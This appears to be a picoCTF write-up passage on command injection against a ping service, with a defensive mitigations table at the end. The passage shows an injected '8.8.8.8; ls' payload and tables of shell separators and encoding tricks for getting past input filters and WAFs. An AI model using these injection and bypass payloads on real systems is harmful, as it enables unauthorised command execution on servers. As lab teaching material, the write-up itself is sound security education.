### Test Command Injection with **;**
The hint says "you can run more than one command at a time." In shell, the ; character separates commands. 
````
nc mysterious-sea.picoctf.net 50865
````
After
````
8.8.8.8; ls
````
<img width="1012" height="256" alt="image" src="https://github.com/user-attachments/assets/2df8279e-cf0b-4024-ab8d-beaf1874b99f" />


Success! The server executed both:
- ``ping -c 2 8.8.8.8`` (the intended command)
- ``ls`` (our injected command)

This confirms command injection is possible.

## Alternative Injection Techniques
If ``; ``doesn't work, try these shell command separators:
| Separator / Syntax | Example Pattern      | What It Does                               | Notes                                |
| ------------------ | -------------------- | ------------------------------------------ | ------------------------------------ |
| `;`                | `input; command`     | Runs another command after the first one   | Most common separator in Unix shells |
| `&&`               | `input && command`   | Runs second command only if first succeeds | Conditional execution                |
| `\|\|`             | `input \|\| command` | Runs second command only if first fails    | Error-based chaining                 |
| `&`                | `input & command`    | Runs command in background                 | Can bypass simple filters            |
| `\|`               | `input \| command`   | Pipes output into another command          | Useful for chaining tools            |
| `` ` ` ``          | `` `command` ``      | Command substitution                       | Older shell syntax                   |
| `$()`              | `$(command)`         | Modern command substitution                | Common in Bash                       |
| `\n`               | `input\ncommand`     | Newline execution                          | Sometimes bypasses filters           |
| `%0a`              | `input%0acommand`    | URL-encoded newline                        | Seen in web apps                     |
| `()`               | `(command)`          | Run command in subshell                    | Shell grouping                       |
| `{}`               | `{ command; }`       | Command grouping                           | Bash syntax                          |
| `<>`               | `command < file`     | Input/output redirection                   | Used with files                      |
| `>>`               | `command >> file`    | Append output to file                      | Log/file manipulation                |
| `>`                | `command > file`     | Overwrite file output                      | Redirection                          |
| `<`                | `command < file`     | Read input from file                       | File injection vector                |
| `*`                | `*`                  | Wildcard expansion                         | Globbing                             |
| `?`                | `?`                  | Single-character wildcard                  | Filename matching                    |
| `~`                | `~`                  | Home directory expansion                   | Environment expansion                |
| `$VAR`             | `$PATH`              | Environment variable expansion             | Can expose environment               |
| `${}`              | `${PATH}`            | Variable expansion syntax                  | Bash parameter expansion             |
| `$(())`            | `$((1+1))`           | Arithmetic expansion                       | Numeric operations                   |
| `'`                | `'text'`             | Single quotes                              | Prevent variable expansion           |
| `"`                | `"text"`             | Double quotes                              | Allows variable expansion            |
| `\`                | `\;`                 | Escape character                           | Escapes special chars                |



## Common Encoding / Filter Bypass Variants

| Technique        | Example       | Purpose                  |
| ---------------- | ------------- | ------------------------ |
| URL Encoding     | `%3b` for `;` | Bypass filters           |
| Double Encoding  | `%253b`       | WAF bypass attempts      |
| Hex Encoding     | `\x3b`        | Obfuscation              |
| Unicode Encoding | `\u003b`      | Alternate representation |
| Space Bypass     | `${IFS}`      | Replace spaces in shells |
| Tabs             | `%09`         | Space replacement        |
| Newlines         | `%0a`         | Multi-line execution     |


## Defensive Mitigations

| Defense              | Description                             |
| -------------------- | --------------------------------------- |
| Input Validation     | Strictly allow expected characters only |
| Parameterized APIs   | Avoid direct shell execution            |
| Escaping             | Properly escape shell arguments         |
| Least Privilege      | Run apps with minimal permissions       |
| Sandboxing           | Isolate command execution               |
| WAF Rules            | Detect suspicious metacharacters        |
| Disable Shell Usage  | Use native language functions instead   |
| Logging & Monitoring | Detect abnormal command patterns        |
